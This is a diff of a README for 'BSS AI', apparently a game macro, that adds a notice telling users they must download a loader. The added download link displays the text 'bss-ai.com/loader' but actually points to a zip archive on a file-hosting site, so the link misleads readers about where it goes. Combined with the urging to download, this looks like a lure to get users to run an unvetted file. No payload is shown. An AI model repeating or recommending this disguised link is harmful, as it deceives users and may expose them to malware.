@@ -1,6 +1,8 @@
 > [!CAUTION]
-> We **highly recommend** downloading the official **BSS AI Loader**, available through our [Discord server][discord-link] or directly on our [website][website-link].
-> The loader provides an easier installation process, automatic updates, and built-in troubleshooting tools to help you get started fast.
+> ⚠️ **This repository only contains the source code for BSS AI.**
+> To **download, install, and run** the full macro (including the AI), you must use the official **BSS AI Loader**, available on our [Discord server][discord-link] or from our [website][website-link].
+>
+> 🔗 **Download the Loader:** [bss-ai.com/loader](https://www.mediafire.com/file/zpodkmnq9ykyd3w/BSSAI+v0.0.1.zip)
 
 <div align="center">
 
@@ -18,13 +20,13 @@
 
 [**Discord**][discord-link] • [**Website**][website-link] • [**TikTok**][tiktok-link] • [**YouTube**][youtube-link]
 
-Our [**website**][website-link] is the best place to explore all of BSS AI’s tools, documentation, changelogs, and news.
+Our [**website**][website-link] is the best place to explore BSS AI — get official downloads, learn about new updates, view changelogs, and access support documentation.
 
 <a name="community"><h2>📞 Community & Support</h2></a>
 
 [**Join us on Discord!**][discord-link]
 
-Our Discord is the heart of the BSS AI community - get updates, chat with other users, and receive support directly from the team.
+Our Discord is the main hub for updates, support, and chatting with the BSS AI community.
 
 <a href="https://discord.gg/bssai">
   <picture>
